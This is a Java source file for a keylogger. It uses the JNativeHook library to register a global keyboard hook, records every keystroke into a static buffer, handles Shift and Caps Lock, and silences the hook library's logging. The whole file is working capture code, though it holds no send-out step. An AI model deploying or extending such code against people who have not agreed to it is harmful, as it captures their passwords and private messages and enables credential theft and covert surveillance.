package org.example;

import java.util.logging.Level;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class Keylog implements NativeKeyListener {

//    public static final Path file = Paths.get("keys.txt");
    public static final Logger logger = LoggerFactory.getLogger(Keylog.class);
    public static StringBuffer keylogStringBuffer = new StringBuffer ("");
    private static boolean checkShift = false;
    private static boolean checkCapLock = false;

    public static void init() {

        // Get the logger for "org.jnativehook" and set the level to warning.
        java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.WARNING);

        // Don't forget to disable the parent handlers.
        logger.setUseParentHandlers(false);
    }

    public void nativeKeyPressed(NativeKeyEvent e) {
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
        if (keyText.length() > 1) {
            if (keyText.equals("Enter"))
            {
                keylogStringBuffer.append('[');
                keylogStringBuffer.append(keyText);
                keylogStringBuffer.append(']');
                keylogStringBuffer.append('\n');
            }
            else {
                if (keyText.equals("Shift")) {
                    checkShift = true;
                }
                else if (keyText.equals("Caps Lock")) {
                    checkCapLock = !checkCapLock;
                }
                else if (keyText.equals("Space")) {
                    keylogStringBuffer.append(" ");
                }
                else {
                    keylogStringBuffer.append('[');
                    keylogStringBuffer.append(keyText);
                    keylogStringBuffer.append(']');
                }
            };
        } else {
            if (checkShift | checkCapLock) {
                keylogStringBuffer.append(keyText);
            }
            else {
                keylogStringBuffer.append(keyText.toLowerCase());
            }
        }
    }

    public void nativeKeyReleased(NativeKeyEvent e) {
        String keyReleaseText = NativeKeyEvent.getKeyText(e.getKeyCode());
        if (keyReleaseText.equals("Shift")) {
            checkShift = false;
        }
    }

    public static void run() {
        logger.info("Keylogger has been started");
        init();
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            Keylog.logger.error(e.getMessage(), e);
            System.exit(-1);
        }
        GlobalScreen.addNativeKeyListener(new Keylog());
    }

    public static void unRun() {
        try {
            GlobalScreen.unregisterNativeHook();
        } catch (NativeHookException e) {
            System.out.println(e);
            throw new RuntimeException(e);
        }
    }

    public void nativeKeyTyped(NativeKeyEvent e) {
        // Nothing here
    }
}
